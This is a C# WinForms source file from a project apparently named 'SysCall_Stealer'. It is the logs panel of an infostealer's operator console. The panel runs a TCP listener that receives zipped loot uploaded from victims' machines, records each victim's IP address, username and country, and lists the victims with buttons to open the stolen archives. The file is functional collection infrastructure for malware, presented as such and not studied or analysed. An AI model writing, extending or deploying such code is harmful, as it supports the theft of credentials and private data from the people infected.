using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.IO;
using Guna.UI2.WinForms;
using Newtonsoft.Json;

namespace SysCall_Stealer
{
    public partial class Logs : UserControl
    {

        public class ClientInfo
        {
            public string CountryCode { get; set; }
            public string IP { get; set; }
            public string Username { get; set; }
            public long FileSize { get; set; }
            public string FilePath { get; set; }
            public DateTime ConnectionTime { get; set; }

            [JsonIgnore]
            public bool FileExists => File.Exists(FilePath);
        }

        private ModernScrollbar customScrollbar;
        private bool isScrollbarVisible = false;

        private TcpListener tcpListener;
        private bool isServerRunning = false;
        private int port = 8888;
        private readonly object lockObj = new object();

        // Persistent storage
        private List<ClientInfo> savedClients = new List<ClientInfo>();
        private string storageFile = "connections.json";

        public Logs()
        {
            InitializeComponent();
            LoadSavedConnections();

        

        }

       
        private void LoadSavedConnections()
        {
            try
            {
                if (File.Exists(storageFile))
                {
                    string json = File.ReadAllText(storageFile);
                    savedClients = JsonConvert.DeserializeObject<List<ClientInfo>>(json) ?? new List<ClientInfo>();

                    Console.WriteLine($"[LOADED] {savedClients.Count} saved connections");

                    // Reload all saved connections to UI
                    foreach (var client in savedClients)
                    {
                        // Update UI usernames to prevent duplicates
                        lock (usernameLock)
                        {
                            uiUsernames.Add(client.Username);
                        }

                        // Add panel to UI
                        AddClientPanel(client.CountryCode, client.IP, client.Username, client.FileSize, client.FilePath);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Loading saved connections: {ex.Message}");
                savedClients = new List<ClientInfo>();
            }
        }

        private void SaveConnections()
        {
            try
            {
                string json = JsonConvert.SerializeObject(savedClients, Formatting.Indented);
                File.WriteAllText(storageFile, json);
                Console.WriteLine($"[SAVED] {savedClients.Count} connections to storage");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Saving connections: {ex.Message}");
            }
        }

        private void AddClientToStorage(string countryCode, string ip, string username, long fileSize, string filePath)
        {
            var clientInfo = new ClientInfo
            {
                CountryCode = countryCode,
                IP = ip,
                Username = username,
                FileSize = fileSize,
                FilePath = filePath,
                ConnectionTime = DateTime.Now
            };

            lock (lockObj)
            {
                // Remove existing entry for same username (if any) to avoid duplicates
                savedClients.RemoveAll(c => c.Username.Equals(username, StringComparison.OrdinalIgnoreCase));
                savedClients.Add(clientInfo);
                SaveConnections();
            }
        }

        public void SetPort(int newPort)
        {
            if (isServerRunning)
            {
                MessageBox.Show("Server is already running. Stop it before changing the port.",
                                "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            port = newPort;
            Console.WriteLine($"[SERVER] Port set to {port}");
        }
        private void Logs_Load(object sender, EventArgs e)
        {
            // Start the TCP server automatically when control loads
            
        }

        public void StartServer()
        {
            if (isServerRunning) return;

            try
            {
                tcpListener = new TcpListener(IPAddress.Any, port);
                tcpListener.Start();
                isServerRunning = true;

                // Start accepting clients asynchronously
                Task.Run(() => AcceptClientsAsync());

                Console.WriteLine($"[SERVER] Started on port {port}");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to start server: {ex.Message}", "Error",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async Task AcceptClientsAsync()
        {
            while (isServerRunning)
            {
                try
                {
                    TcpClient client = await tcpListener.AcceptTcpClientAsync();

                    // Handle each client in a separate task (non-blocking)
                    _ = Task.Run(() => HandleClientAsync(client));
                }
                catch (Exception ex)
                {
                    if (isServerRunning)
                    {
                        Console.WriteLine($"[ERROR] Accept client: {ex.Message}");
                    }
                }
            }
        }

        private HashSet<string> connectedUsernames = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        private HashSet<string> uiUsernames = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        private readonly object usernameLock = new object();
        private async Task HandleClientAsync(TcpClient client)
        {
            NetworkStream stream = null;
            string clientIP = "";
            string username = "";

            try
            {
                clientIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                stream = client.GetStream();

                // Read client data header (username and filename)
                byte[] headerLengthBuffer = new byte[4];
                await stream.ReadAsync(headerLengthBuffer, 0, 4);
                int headerLength = BitConverter.ToInt32(headerLengthBuffer, 0);

                byte[] headerBuffer = new byte[headerLength];
                await stream.ReadAsync(headerBuffer, 0, headerLength);
                string header = Encoding.UTF8.GetString(headerBuffer);

                // Parse header: format "USERNAME|FILENAME"
                string[] headerParts = header.Split('|');
                username = headerParts[0];
                string filename = headerParts[1];

                // Check if username is already connected OR already in UI
                bool usernameAlreadyExists;
                lock (usernameLock)
                {
                    usernameAlreadyExists = connectedUsernames.Contains(username) || uiUsernames.Contains(username);
                    if (!usernameAlreadyExists)
                    {
                        connectedUsernames.Add(username);
                    }
                }

                if (usernameAlreadyExists)
                {
                    // Send rejection message to client
                    byte[] rejectBuffer = Encoding.UTF8.GetBytes("ERROR:Username already connected or exists in UI");
                    await stream.WriteAsync(rejectBuffer, 0, rejectBuffer.Length);

                    Console.WriteLine($"[REJECTED] Username {username} from {clientIP} is already connected or exists in UI");
                    return;
                }

                // Read file size
                byte[] fileSizeBuffer = new byte[8];
                await stream.ReadAsync(fileSizeBuffer, 0, 8);
                long fileSize = BitConverter.ToInt64(fileSizeBuffer, 0);

                // Extract country code from filename (first 2 letters)
                string countryCode = filename.Length >= 2 ? filename.Substring(0, 2).ToUpper() : "XX";

                // Create directory for received files
                string receivedFilesPath = Path.Combine(Application.StartupPath, "ReceivedFiles");
                Directory.CreateDirectory(receivedFilesPath);

                // Receive the zip file
                string savedFilePath = Path.Combine(receivedFilesPath,
                    $"{username}_{DateTime.Now:yyyyMMdd_HHmmss}_{filename}");

                using (FileStream fileStream = new FileStream(savedFilePath, FileMode.Create, FileAccess.Write))
                {
                    byte[] buffer = new byte[8192]; // 8KB buffer
                    long totalBytesRead = 0;
                    int bytesRead;

                    while (totalBytesRead < fileSize)
                    {
                        int toRead = (int)Math.Min(buffer.Length, fileSize - totalBytesRead);
                        bytesRead = await stream.ReadAsync(buffer, 0, toRead);

                        if (bytesRead == 0) break;

                        await fileStream.WriteAsync(buffer, 0, bytesRead);
                        totalBytesRead += bytesRead;
                    }
                }

                // Send acknowledgment to client
                byte[] ackBuffer = Encoding.UTF8.GetBytes("OK");
                await stream.WriteAsync(ackBuffer, 0, ackBuffer.Length);

                Console.WriteLine($"[SUCCESS] Received {filename} from {username} ({clientIP}) - {FormatFileSize(fileSize)}");


                AddClientToStorage(countryCode, clientIP, username, fileSize, savedFilePath);
                // Add panel to UI (thread-safe) and track in UI usernames
                AddClientPanel(countryCode, clientIP, username, fileSize, savedFilePath);

                // Add to UI usernames (permanently, not removed on disconnect)
                lock (usernameLock)
                {
                    uiUsernames.Add(username);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Handling client {clientIP}: {ex.Message}");
            }
            finally
            {
                // Remove username from connected list when client disconnects
                // But keep it in uiUsernames to prevent duplicates in UI
                if (!string.IsNullOrEmpty(username))
                {
                    lock (usernameLock)
                    {
                        connectedUsernames.Remove(username);
                        // Note: We DON'T remove from uiUsernames here
                    }
                }

                stream?.Close();
                client?.Close();
            }
        }
        private void AddClientPanel(string countryCode, string ip, string username, long fileSize, string filePath)
        {


            // Ensure UI update happens on the UI thread
            if (flowLayoutPanel2.InvokeRequired)
            {
                flowLayoutPanel2.Invoke(new Action(() => AddClientPanel(countryCode, ip, username, fileSize, filePath)));
                return;
            }

            bool usernameExistsInUI = false;
            foreach (Control control in flowLayoutPanel2.Controls)
            {
                if (control is Guna.UI2.WinForms.Guna2Panel panel)
                {
                    // Look for the username label in this panel
                    foreach (Control childControl in panel.Controls)
                    {
                        if (childControl is Label label &&
                            label.ForeColor == Color.FromArgb(100, 200, 255) && // Username label color
                            label.Text == username)
                        {
                            usernameExistsInUI = true;
                            break;
                        }
                    }
                    if (usernameExistsInUI) break;
                }
            }
            if (usernameExistsInUI)
            {
                Console.WriteLine($"[SKIPPED] Username {username} already exists in UI");
                return;
            }
            try
            {
                // Fixed width for the panel
                int panelWidth = 426;
                int panelHeight = 50;

                // Create new Guna2Panel with specified color and fixed size
                Guna.UI2.WinForms.Guna2Panel clientPanel = new Guna.UI2.WinForms.Guna2Panel
                {
                    Size = new Size(panelWidth, panelHeight),
                    BorderRadius = 8,
                    FillColor = Color.FromArgb(19, 34, 54), // Your specified panel color
                    BorderColor = Color.FromArgb(40, 40, 40),
                    BorderThickness = 1,
                    Margin = new Padding(5, 3, 5, 3) // Tighter margins
                };

                // Tighter column layout
                int flagWidth = 25;
                int ipWidth = 100;
                int usernameWidth = 120;
                int sizeWidth = 70;
                int buttonWidth = 70;
                int padding = 8;

                // Calculate starting positions
                int flagStart = padding;
                int ipStart = flagStart + flagWidth + 5; // Very close to flag
                int usernameStart = ipStart + ipWidth + 5; // Very close to IP
                int sizeStart = usernameStart + usernameWidth + 5; // Very close to username
                int buttonStart = panelWidth - buttonWidth - padding;

                // Flag PictureBox
                PictureBox flagPictureBox = new PictureBox
                {
                    Size = new Size(flagWidth, 18), // Smaller flag
                    Location = new Point(flagStart, 16),
                    SizeMode = PictureBoxSizeMode.StretchImage,
                    BackColor = Color.Transparent
                };

                // Load flag image
                string flagPath = Path.Combine(Application.StartupPath, "flags", $"{countryCode}.png");
                if (File.Exists(flagPath))
                {
                    flagPictureBox.Image = Image.FromFile(flagPath);
                }
                else
                {
                    // Default flag if not found
                    flagPath = Path.Combine(Application.StartupPath, "flags", "XX.png");
                    if (File.Exists(flagPath))
                    {
                        flagPictureBox.Image = Image.FromFile(flagPath);
                    }
                }

                // IP Label
                Label ipLabel = new Label
                {
                    Text = ip,
                    Location = new Point(ipStart, 16),
                    Size = new Size(ipWidth, 20),
                    ForeColor = Color.White,
                    Font = new Font("Segoe UI", 9, FontStyle.Regular),
                    BackColor = Color.Transparent,
                    TextAlign = ContentAlignment.MiddleLeft
                };

                // Username Label
                Label usernameLabel = new Label
                {
                    Text = username,
                    Location = new Point(usernameStart, 16),
                    Size = new Size(usernameWidth, 20),
                    ForeColor = Color.FromArgb(100, 200, 255),
                    Font = new Font("Segoe UI", 9, FontStyle.Regular),
                    BackColor = Color.Transparent,
                    TextAlign = ContentAlignment.MiddleLeft
                };

                // File Size Label
                Label fileSizeLabel = new Label
                {
                    Text = FormatFileSize(fileSize),
                    Location = new Point(sizeStart, 16),
                    Size = new Size(sizeWidth, 20),
                    ForeColor = Color.LightGray,
                    Font = new Font("Segoe UI", 9, FontStyle.Regular),
                    BackColor = Color.Transparent,
                    TextAlign = ContentAlignment.MiddleLeft
                };

                // Open File Button with specified colors
                Guna.UI2.WinForms.Guna2Button openButton = new Guna.UI2.WinForms.Guna2Button
                {
                    Text = "Open",
                    Size = new Size(buttonWidth, 26),
                    Location = new Point(buttonStart, 12),
                    BorderRadius = 4,
                    FillColor = Color.FromArgb(19, 34, 54),  // same as panel
                    BorderColor = Color.FromArgb(100, 200, 255),  // light blue border
                    BorderThickness = 1,
                    ForeColor = Color.FromArgb(100, 200, 255),  // light blue text
                    Font = new Font("Segoe UI", 8, FontStyle.Regular),
                    BackColor= Color.Transparent,
                    Tag = filePath
                };
                openButton.Click += (s, e) =>
                {
                    try
                    {
                        if (File.Exists(openButton.Tag.ToString()))
                        {
                            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                            {
                                FileName = openButton.Tag.ToString(),
                                UseShellExecute = true
                            });
                        }
                        else
                        {
                            MessageBox.Show("File not found!", "Error",
                                MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"Error opening file: {ex.Message}", "Error",
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                };

                // Add controls to panel
                clientPanel.Controls.Add(flagPictureBox);
                clientPanel.Controls.Add(ipLabel);
                clientPanel.Controls.Add(usernameLabel);
                clientPanel.Controls.Add(fileSizeLabel);
                clientPanel.Controls.Add(openButton);

                // Add panel to flowLayoutPanel (insert at top)
                flowLayoutPanel2.Controls.Add(clientPanel);
                flowLayoutPanel2.Controls.SetChildIndex(clientPanel, 0);


                label1.Text = $"Logs: {flowLayoutPanel2.Controls.Count}";
         
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Adding panel to UI: {ex.Message}");
            }
        }
        public class NoScrollFlowLayoutPanel : FlowLayoutPanel
        {
            protected override CreateParams CreateParams
            {
                get
                {
                    var cp = base.CreateParams;
                    cp.Style &= ~0x100000; // remove WS_VSCROLL
                    cp.Style &= ~0x200000; // remove WS_HSCROLL (optional)
                    return cp;
                }
            }
        }



        private string FormatFileSize(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;

            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }

            return $"{len:0.##} {sizes[order]}";
        }

        public void StopServer()
        {
            if (!isServerRunning) return;

            isServerRunning = false;
            tcpListener?.Stop();
            Console.WriteLine("[SERVER] Stopped");
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                StopServer();
            }
            base.Dispose(disposing);
        }

        //// Example test values
        //string countryCode = "US";      // country code for flag
        //string ip = "192.168.1.100";    // test IP
        //string username = "TestUser";   // test username
        //long fileSize = 2321;           // test file size in bytes
        //string filePath = @"C:\Temp\TestFile.txt"; // test file path

        //AddClientPanel(countryCode, ip, username, fileSize, filePath);
        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
          
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }
    }
}